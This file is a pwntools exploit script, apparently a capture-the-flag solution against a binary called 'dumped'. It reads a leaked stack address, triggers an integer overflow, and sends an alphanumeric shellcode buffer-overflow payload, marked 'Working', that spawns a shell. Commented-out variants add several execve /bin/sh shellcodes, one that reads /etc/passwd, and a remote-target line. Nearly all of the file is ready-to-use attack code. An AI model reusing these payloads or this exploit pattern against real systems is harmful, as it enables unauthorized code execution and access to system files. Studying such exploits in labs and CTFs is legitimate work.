from pwn import *

context.binary = binary = './dumped'

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
# libc = ELF(vuln_elf.runpath+b'/libc.so.6')

gs = '''
b *start
c 
'''

def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)

 

p = start()
#p = remote('10.21.234.231', 4444)

p.recvuntil(b"dumped: ")

leak = p.recvuntil(b"\n").strip()
leak = int(leak, 16)
log.info(f"{hex(leak)=}")

p.sendafter(b'throwing: ', b'4294967295\n')

# shell_code = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
# payload = shell_code
# payload += b'A' * (136 - len(payload))
# payload += p64(leak)
# payload += b'\x00'*(4294967295 - len(payload))

# payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

# Working
payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload += b'A' * (104 - len(payload))
payload += p64(leak)
print(payload, len(payload))
p.sendafter(b'trash: ', payload)

# Testing
# payload = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

# Test 2
# payload = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

# Test 3
# payload = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

# Test 4
# payload = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)


# Test 5 read /etc/passwd
# payload = b'\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'
# payload += b'A' * (104 - len(payload))
# payload += p64(leak)
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

# payload = b'A'*100
# payload += b"B"*4
# print(payload, len(payload))
# p.sendafter(b'name: ', payload)

p.interactive()
